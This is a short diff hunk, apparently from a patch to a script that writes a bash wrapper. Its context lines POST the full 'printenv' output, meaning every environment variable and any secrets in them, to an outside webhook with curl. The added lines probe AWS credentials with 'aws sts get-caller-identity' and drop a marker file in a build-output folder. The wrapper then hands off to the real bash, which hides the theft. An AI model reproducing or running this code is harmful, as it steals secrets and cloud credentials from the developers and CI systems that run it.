@@ -26,7 +26,14 @@ curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(printenv)" \
   "$webhook/printenv" 
+
+aws sts get-caller-identity 
+mkdir -p frontend/storybook-static
+echo "hello" >> frontend/storybook-static/text.txt
+
+
 exec /usr/bin/bash "$@"
+
 
 EOF
 
